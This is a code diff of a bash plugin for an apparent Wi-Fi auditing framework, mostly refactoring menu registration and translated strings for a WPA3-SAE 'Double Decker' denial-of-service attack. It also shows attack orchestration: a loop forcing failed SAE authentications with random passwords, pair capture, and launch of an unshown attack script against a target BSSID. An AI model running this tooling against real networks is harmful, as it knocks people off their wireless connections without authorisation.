@@ -11,9 +11,13 @@ plugin_description="A plugin to perform a WPA3-SAE Double Decker DoS attack (2.4
 plugin_author="Nuseo1"
 
 plugin_enabled=1
+
 plugin_minimum_ag_affected_version="12.01"
 plugin_maximum_ag_affected_version=""
 plugin_distros_supported=("*")
+
+plugin_wpa3_menu_option_function="double_decker_attack_option"
+plugin_wpa3_menu_option_language_string="double_decker_attack_menu_option"
 
 declare -gA double_decker_attack_sae_pairs_cache
 
@@ -21,6 +25,7 @@ declare -gA double_decker_attack_sae_pairs_cache
 # Frequency helper
 # ----------------------------------------------------------------------
 function double_decker_attack_get_frequency() {
+
 	local ch=$1
 	if (( ch >= 1 && ch <= 14 )); then
 		if (( ch == 14 )); then freq=2484; else freq=$(( 2407 + ch * 5 )); fi
@@ -34,17 +39,20 @@ function double_decker_attack_get_frequency() {
 }
 
 function double_decker_attack_set_interface_freq() {
+
 	double_decker_attack_get_frequency "${channel}"
 	iw dev "${interface}" set freq "${freq}" > /dev/null 2>&1
 }
 
 function double_decker_attack_is_5ghz_channel() {
+
 	local ch=$1
 	if (( ch >= 32 && ch <= 177 )); then return 0; fi
 	return 1
 }
 
 function double_decker_attack_is_6ghz_channel() {
+
 	[[ "${band}" = "6GHz" ]] && return 0
 	return 1
 }
@@ -53,6 +61,7 @@ function double_decker_attack_is_6ghz_channel() {
 # Python validations
 # ----------------------------------------------------------------------
 function python3_double_decker_attack_script_validation() {
+
 	if ! [ -f "${scriptfolder}${plugins_dir}double_decker_attack.py" ]; then
 		echo
 		language_strings "${language}" "double_decker_attack_3" "red"
@@ -63,6 +72,7 @@ function python3_double_decker_attack_script_validation() {
 }
 
 function python3_double_decker_attack_validation() {
+
 	if ! hash python3 2> /dev/null; then
 		if ! hash python 2> /dev/null; then
 			echo
@@ -116,17 +126,13 @@ function python3_double_decker_attack_validation() {
 # Attack execution
 # ----------------------------------------------------------------------
 function exec_double_decker_attack() {
+
 	double_decker_attack_set_interface_freq
 	local pairs_arg="${double_decker_attack_sae_pairs_cache[${bssid}]}"
 
 	recalculate_windows_sizes
-	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Double Decker attack\"" \
-		"${python3} ${scriptfolder}${plugins_dir}double_decker_attack.py ${bssid} ${channel} ${interface} ${language} '${pairs_arg}' ${band}" \
-		"Double Decker attack" "active"
-	if ! wait_for_process "${python3} ${scriptfolder}${plugins_dir}double_decker_attack.py ${bssid} ${channel} ${interface} ${language} '${pairs_arg}' ${band}" \
-		"Double Decker attack"; then
-		return 1
-	fi
+	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Double Decker attack\"" "${python3} ${scriptfolder}${plugins_dir}double_decker_attack.py ${bssid} ${channel} ${interface} ${language} '${pairs_arg}' ${band}" "Double Decker attack" "active"
+	wait_for_process "${python3} ${scriptfolder}${plugins_dir}double_decker_attack.py ${bssid} ${channel} ${interface} ${language} '${pairs_arg}' ${band}" "Double Decker attack"
 }
 
 # ----------------------------------------------------------------------
@@ -215,6 +221,7 @@ function double_decker_attack_set_wpa_supplicant_config() {
 }
 
 function double_decker_attack_kill_windows() {
+
 	if [ -n "${double_decker_attack_capture_pid}" ]; then
 		kill "${double_decker_attack_capture_pid}" 2>/dev/null
 	fi
@@ -256,6 +263,7 @@ print(";".join(list(pairs)[:20]))
 }
 
 function double_decker_attack_20_pair_capture() {
+
 	rm -rf "${tmpdir}double_decker"* > /dev/null 2>&1
 	double_decker_attack_get_frequency "${channel}"
 
@@ -263,8 +271,7 @@ function double_decker_attack_20_pair_capture() {
 	local double_decker_wpa_supplicant_cmd="while true; do RAND_PASS=\$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 20); wpa_supplicant -B -Dnl80211 -i ${secondary_wifi_interface} -c ${tmpdir}double_decker_wpa_supplicant.conf >/dev/null 2>&1; sleep 1.5; killall -9 wpa_supplicant 2>/dev/null; done"
 
 	recalculate_windows_sizes
-	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing 20 SAE Pairs\"" \
-		"${double_decker_airodump_cmd}" "Capturing 20 SAE Pairs" "active"
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing 20 SAE Pairs\"" "${double_decker_airodump_cmd}" "Capturing 20 SAE Pairs" "active"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		get_tmux_process_id "${double_decker_airodump_cmd}"
 		double_decker_attack_capture_pid="${global_process_pid}"
@@ -276,8 +283,7 @@ function double_decker_attack_20_pair_capture() {
 	sleep 2
 
 	recalculate_windows_sizes
-	manage_output "+j -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g1_bottomright_window} -T \"Forcing Failed Auths\"" \
-		"${double_decker_wpa_supplicant_cmd}" "Forcing Failed Auths" "active"
+	manage_output "+j -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g1_bottomright_window} -T \"Forcing Failed Auths\"" "${double_decker_wpa_supplicant_cmd}" "Forcing Failed Auths" "active"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		get_tmux_process_id "${double_decker_wpa_supplicant_cmd}"
 		double_decker_attack_wpa_supplicant_pid="${global_process_pid}"
@@ -311,6 +317,7 @@ function double_decker_attack_20_pair_capture() {
 # Main menu entry point
 # ----------------------------------------------------------------------
 function double_decker_attack_option() {
+
 	get_aircrack_version
 	if ! validate_aircrack_wpa3_version; then
 		echo
@@ -390,71 +397,24 @@ function double_decker_attack_option() {
 }
 
 # ----------------------------------------------------------------------
-# Menu prehook
-# ----------------------------------------------------------------------
-function double_decker_attack_prehook_hookable_wpa3_attacks_menu() {
-	if [[ "${arr["ENGLISH",756]}" == *"WPA3 Double Decker attack"* ]] || [[ "${arr["ENGLISH",756]}" == *"WPA3 attack (use a plugin here)"* ]]; then
-		plugin_x="double_decker_attack_option"
-		plugin_x_under_construction=""
-	elif [[ "${arr["ENGLISH",757]}" == *"WPA3 Double Decker attack"* ]] || [[ "${arr["ENGLISH",757]}" == *"WPA3 attack (use a plugin here)"* ]]; then
-		plugin_y="double_decker_attack_option"
-		plugin_y_under_construction=""
-	elif [[ "${arr["ENGLISH",812]}" == *"WPA3 Double Decker attack"* ]] || [[ "${arr["ENGLISH",812]}" == *"WPA3 attack (use a plugin here)"* ]]; then
-		plugin_z="double_decker_attack_option"
-		plugin_z_under_construction=""
-	fi
-}
-
-# ----------------------------------------------------------------------
 # Language strings
 # ----------------------------------------------------------------------
 function double_decker_attack_prehook_hookable_for_languages() {
 
-	if [ "${arr['ENGLISH',756]}" = "6.  WPA3 attack (use a plugin here)" ]; then
-		arr["ENGLISH",756]="6.  WPA3 Double Decker attack"
-		arr["SPANISH",756]="6.  Ataque WPA3 Double Decker"
-		arr["FRENCH",756]="\${pending_of_translation} 6.  Attaque WPA3 Double Decker"
-		arr["CATALAN",756]="\${pending_of_translation} 6.  Atac WPA3 Double Decker"
-		arr["PORTUGUESE",756]="\${pending_of_translation} 6.  Ataque WPA3 Double Decker"
-		arr["RUSSIAN",756]="\${pending_of_translation} 6.  Атака WPA3 Double Decker"
-		arr["GREEK",756]="\${pending_of_translation} 6.  Επίθεση WPA3 Double Decker"
-		arr["ITALIAN",756]="\${pending_of_translation} 6.  Attacco WPA3 Double Decker"
-		arr["POLISH",756]="\${pending_of_translation} 6.  Atak WPA3 Double Decker"
-		arr["GERMAN",756]="6.  WPA3 Double Decker Angriff"
-		arr["TURKISH",756]="\${pending_of_translation} 6.  WPA3 Double Decker saldırısı"
-		arr["ARABIC",756]="\${pending_of_translation} 6.  هجوم WPA3 Double Decker"
-		arr["CHINESE",756]="\${pending_of_translation} 6.  WPA3 Double Decker 攻击"
-	elif [ "${arr['ENGLISH',757]}" = "7.  WPA3 attack (use a plugin here)" ]; then
-		arr["ENGLISH",757]="7.  WPA3 Double Decker attack"
-		arr["SPANISH",757]="7.  Ataque WPA3 Double Decker"
-		arr["FRENCH",757]="\${pending_of_translation} 7.  Attaque WPA3 Double Decker"
-		arr["CATALAN",757]="\${pending_of_translation} 7.  Atac WPA3 Double Decker"
-		arr["PORTUGUESE",757]="\${pending_of_translation} 7.  Ataque WPA3 Double Decker"
-		arr["RUSSIAN",757]="\${pending_of_translation} 7.  Атака WPA3 Double Decker"
-		arr["GREEK",757]="\${pending_of_translation} 7.  Επίθεση WPA3 Double Decker"
-		arr["ITALIAN",757]="\${pending_of_translation} 7.  Attacco WPA3 Double Decker"
-		arr["POLISH",757]="\${pending_of_translation} 7.  Atak WPA3 Double Decker"
-		arr["GERMAN",757]="7.  WPA3 Double Decker Angriff"
-		arr["TURKISH",757]="\${pending_of_translation} 7.  WPA3 Double Decker saldırısı"
-		arr["ARABIC",757]="\${pending_of_translation} 7.  هجوم WPA3 Double Decker"
-		arr["CHINESE",757]="\${pending_of_translation} 7.  WPA3 Double Decker 攻击"
-	elif [ "${arr['ENGLISH',812]}" = "8.  WPA3 attack (use a plugin here)" ]; then
-		arr["ENGLISH",812]="8.  WPA3 Double Decker attack"
-		arr["SPANISH",812]="8.  Ataque WPA3 Double Decker"
-		arr["FRENCH",812]="\${pending_of_translation} 8.  Attaque WPA3 Double Decker"
-		arr["CATALAN",812]="\${pending_of_translation} 8.  Atac WPA3 Double Decker"
-		arr["PORTUGUESE",812]="\${pending_of_translation} 8.  Ataque WPA3 Double Decker"
-		arr["RUSSIAN",812]="\${pending_of_translation} 8.  Атака WPA3 Double Decker"
-		arr["GREEK",812]="\${pending_of_translation} 8.  Επίθεση WPA3 Double Decker"
-		arr["ITALIAN",812]="\${pending_of_translation} 8.  Attacco WPA3 Double Decker"
-		arr["POLISH",812]="\${pending_of_translation} 8.  Atak WPA3 Double Decker"
-		arr["GERMAN",812]="8.  WPA3 Double Decker Angriff"
-		arr["TURKISH",812]="\${pending_of_translation} 8.  WPA3 Double Decker saldırısı"
-		arr["ARABIC",812]="\${pending_of_translation} 8.  هجوم WPA3 Double Decker"
-		arr["CHINESE",812]="\${pending_of_translation} 8.  WPA3 Double Decker 攻击"
-	fi
+	arr["ENGLISH","double_decker_attack_menu_option"]="WPA3 Double Decker attack"
+	arr["SPANISH","double_decker_attack_menu_option"]="Ataque WPA3 Double Decker"
+	arr["FRENCH","double_decker_attack_menu_option"]="\${pending_of_translation} Attaque WPA3 Double Decker"
+	arr["CATALAN","double_decker_attack_menu_option"]="\${pending_of_translation} Atac WPA3 Double Decker"
+	arr["PORTUGUESE","double_decker_attack_menu_option"]="\${pending_of_translation} Ataque WPA3 Double Decker"
+	arr["RUSSIAN","double_decker_attack_menu_option"]="\${pending_of_translation} Атака WPA3 Double Decker"
+	arr["GREEK","double_decker_attack_menu_option"]="\${pending_of_translation} Επίθεση WPA3 Double Decker"
+	arr["ITALIAN","double_decker_attack_menu_option"]="\${pending_of_translation} Attacco WPA3 Double Decker"
+	arr["POLISH","double_decker_attack_menu_option"]="\${pending_of_translation} Atak WPA3 Double Decker"
+	arr["GERMAN","double_decker_attack_menu_option"]="WPA3 Double Decker Angriff"
+	arr["TURKISH","double_decker_attack_menu_option"]="\${pending_of_translation} WPA3 Double Decker saldırısı"
+	arr["ARABIC","double_decker_attack_menu_option"]="\${pending_of_translation} هجوم WPA3 Double Decker"
+	arr["CHINESE","double_decker_attack_menu_option"]="\${pending_of_translation} WPA3 Double Decker 攻击"
 
-	# double_decker_attack_1
 	arr["ENGLISH","double_decker_attack_1"]="WPA3 Double Decker DoS combines Omnivore and Muted attacks"
 	arr["SPANISH","double_decker_attack_1"]="El ataque DoS WPA3 Double Decker combina los ataques Omnivore y Muted"
 	arr["FRENCH","double_decker_attack_1"]="\${pending_of_translation} Le DoS WPA3 Double Decker combine les attaques Omnivore et Muted"
@@ -469,7 +429,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_1"]="\${pending_of_translation} Omnivore وMuted يجمع هجوم WPA3 Double Decker DoS بين هجمات"
 	arr["CHINESE","double_decker_attack_1"]="\${pending_of_translation} WPA3 Double Decker DoS 结合了 Omnivore 和 Muted 攻击"
 
-	# double_decker_attack_2
 	arr["ENGLISH","double_decker_attack_2"]="This attack requires python3.6+ installed on your system"
 	arr["SPANISH","double_decker_attack_2"]="Este ataque requiere tener python3.6+ instalado en el sistema"
 	arr["FRENCH","double_decker_attack_2"]="\${pending_of_translation} Cette attaque nécessite python3.6+"
@@ -484,7 +443,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_2"]="\${pending_of_translation} python3.6+ يتطلب هذا الهجوم"
 	arr["CHINESE","double_decker_attack_2"]="\${pending_of_translation} 此攻击需要 python3.6+"
 
-	# double_decker_attack_3
 	arr["ENGLISH","double_decker_attack_3"]="Python attack script double_decker_attack.py not found"
 	arr["SPANISH","double_decker_attack_3"]="No se encontró el script python double_decker_attack.py"
 	arr["FRENCH","double_decker_attack_3"]="\${pending_of_translation} Le script python double_decker_attack.py est introuvable"
@@ -499,7 +457,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_3"]="\${pending_of_translation} double_decker_attack.py لم يتم العثور على سكربت بايثون"
 	arr["CHINESE","double_decker_attack_3"]="\${pending_of_translation} 未找到 Python 攻击脚本 double_decker_attack.py"
 
-	# double_decker_attack_4
 	arr["ENGLISH","double_decker_attack_4"]="This attack requires tshark installed"
 	arr["SPANISH","double_decker_attack_4"]="Este ataque requiere tshark instalado"
 	arr["FRENCH","double_decker_attack_4"]="\${pending_of_translation} Cette attaque nécessite tshark"
@@ -514,7 +471,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_4"]="\${pending_of_translation} tshark يتطلب هذا الهجوم تثبيت"
 	arr["CHINESE","double_decker_attack_4"]="\${pending_of_translation} 此攻击需要安装 tshark"
 
-	# double_decker_attack_5
 	arr["ENGLISH","double_decker_attack_5"]="This attack requires wpa_supplicant installed"
 	arr["SPANISH","double_decker_attack_5"]="Este ataque requiere wpa_supplicant instalado"
 	arr["FRENCH","double_decker_attack_5"]="\${pending_of_translation} Cette attaque nécessite wpa_supplicant"
@@ -529,7 +485,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_5"]="\${pending_of_translation} wpa_supplicant يتطلب هذا الهجوم تثبيت"
 	arr["CHINESE","double_decker_attack_5"]="\${pending_of_translation} 此攻击需要安装 wpa_supplicant"
 
-	# double_decker_attack_6
 	arr["ENGLISH","double_decker_attack_6"]="Do you want to manually introduce the 20 SAE pairs? [y/N]"
 	arr["SPANISH","double_decker_attack_6"]="¿Desea introducir manualmente los 20 pares SAE? [y/N]"
 	arr["FRENCH","double_decker_attack_6"]="\${pending_of_translation} Voulez-vous saisir manuellement les 20 paires SAE? [y/N]"
@@ -544,7 +499,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_6"]="\${pending_of_translation} SAE هل تريد إدخال 20 زوجًا من [y/N]"
 	arr["CHINESE","double_decker_attack_6"]="\${pending_of_translation} 是否要手动输入 20 个 SAE 对？ [y/N]"
 
-	# double_decker_attack_9
 	arr["ENGLISH","double_decker_attack_9"]="Attack is ready. 20 SAE pairs loaded"
 	arr["SPANISH","double_decker_attack_9"]="Ataque preparado. 20 pares SAE cargados"
 	arr["FRENCH","double_decker_attack_9"]="\${pending_of_translation} Attaque prête. 20 paires SAE chargées"
@@ -559,7 +513,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_9"]="\${pending_of_translation} تم تحميل 20 زوجًا من SAE الهجوم جاهز"
 	arr["CHINESE","double_decker_attack_9"]="\${pending_of_translation} 攻击已准备就绪。已加载 20 个 SAE 对"
 
-	# double_decker_attack_11
 	arr["ENGLISH","double_decker_attack_11"]="Starting automatic capture of 20 SAE pairs..."
 	arr["SPANISH","double_decker_attack_11"]="Iniciando captura automática de 20 pares SAE..."
 	arr["FRENCH","double_decker_attack_11"]="\${pending_of_translation} Démarrage de la capture automatique de 20 paires SAE..."
@@ -574,7 +527,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_11"]="\${pending_of_translation} ... SAE بدء الالتقاط التلقائي لـ 20 زوجًا من"
 	arr["CHINESE","double_decker_attack_11"]="\${pending_of_translation} 开始自动捕获 20 个 SAE 对..."
 
-	# double_decker_attack_12
 	arr["ENGLISH","double_decker_attack_12"]="Failed to capture 20 SAE pairs. Check target and distance"
 	arr["SPANISH","double_decker_attack_12"]="No se pudieron capturar 20 pares SAE. Verifique el objetivo y la distancia"
 	arr["FRENCH","double_decker_attack_12"]="\${pending_of_translation} Échec de la capture des 20 paires SAE. Vérifiez la cible et la distance"
@@ -589,7 +541,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_12"]="\${pending_of_translation} فشل التقاط 20 زوجًا من SAE. تحقق من الهدف والمسافة"
 	arr["CHINESE","double_decker_attack_12"]="\${pending_of_translation} 无法捕获 20 个 SAE 对。请检查目标和距离"
 
-	# double_decker_attack_13
 	arr["ENGLISH","double_decker_attack_13"]="Successfully captured 20 SAE pairs"
 	arr["SPANISH","double_decker_attack_13"]="Se capturaron exitosamente 20 pares SAE"
 	arr["FRENCH","double_decker_attack_13"]="\${pending_of_translation} 20 paires SAE capturées avec succès"
@@ -604,7 +555,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_13"]="\${pending_of_translation} SAE تم بنجاح التقاط 20 زوجًا من"
 	arr["CHINESE","double_decker_attack_13"]="\${pending_of_translation} 成功捕获 20 个 SAE 对"
 
-	# double_decker_attack_14
 	arr["ENGLISH","double_decker_attack_14"]="Secondary interface must be in managed mode"
 	arr["SPANISH","double_decker_attack_14"]="La interfaz secundaria debe estar en modo managed"
 	arr["FRENCH","double_decker_attack_14"]="\${pending_of_translation} L'interface secondaire doit être en mode managed"
@@ -619,7 +569,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_14"]="\${pending_of_translation} managed يجب أن تكون الواجهة الثانوية في وضع"
 	arr["CHINESE","double_decker_attack_14"]="\${pending_of_translation} 辅助接口必须处于 managed 模式"
 
-	# double_decker_attack_15
 	arr["ENGLISH","double_decker_attack_15"]="Cached SAE pairs found for this BSSID. Use them?"
 	arr["SPANISH","double_decker_attack_15"]="Se encontraron pares SAE en caché para este BSSID. ¿Utilizarlos?"
 	arr["FRENCH","double_decker_attack_15"]="\${pending_of_translation} Des paires SAE en cache ont été trouvées pour ce BSSID. Les utiliser ?"
@@ -634,7 +583,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_15"]="\${pending_of_translation} هل تريد استخدامها؟ BSSID تم العثور على أزواج SAE مخزنة مؤقتًا لهذا"
 	arr["CHINESE","double_decker_attack_15"]="\${pending_of_translation} 为此 BSSID 找到缓存的 SAE 对。是否使用？"
 
-	# double_decker_attack_manual_1
 	arr["ENGLISH","double_decker_attack_manual_1"]="Input SAE Pair"
 	arr["SPANISH","double_decker_attack_manual_1"]="Ingrese el par SAE"
 	arr["FRENCH","double_decker_attack_manual_1"]="\${pending_of_translation} Saisissez la paire SAE"
@@ -649,7 +597,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_manual_1"]="\${pending_of_translation} SAE أدخل زوج"
 	arr["CHINESE","double_decker_attack_manual_1"]="\${pending_of_translation} 输入 SAE 对"
 
-	# double_decker_attack_manual_2
 	arr["ENGLISH","double_decker_attack_manual_2"]="Insert Scalar (64 hex chars)"
 	arr["SPANISH","double_decker_attack_manual_2"]="Inserte Scalar (64 caracteres hexadecimales)"
 	arr["FRENCH","double_decker_attack_manual_2"]="\${pending_of_translation} Insérez Scalar (64 caractères hexadécimaux)"
@@ -664,7 +611,6 @@ function double_decker_attack_prehook_hookable_for_languages() {
 	arr["ARABIC","double_decker_attack_manual_2"]="\${pending_of_translation} (64 حرفًا سداسيًا عشريًا) Scalar أدخل"
 	arr["CHINESE","double_decker_attack_manual_2"]="\${pending_of_translation} 输入 Scalar（64 个十六进制字符）"
 
-	# double_decker_attack_manual_3
 	arr["ENGLISH","double_decker_attack_manual_3"]="Insert Finite Field Element (128 hex chars)"
 	arr["SPANISH","double_decker_attack_manual_3"]="Inserte Finite Field Element (128 caracteres hexadecimales)"
 	arr["FRENCH","double_decker_attack_manual_3"]="\${pending_of_translation} Insérez Finite Field Element (128 caractères hexadécimaux)"
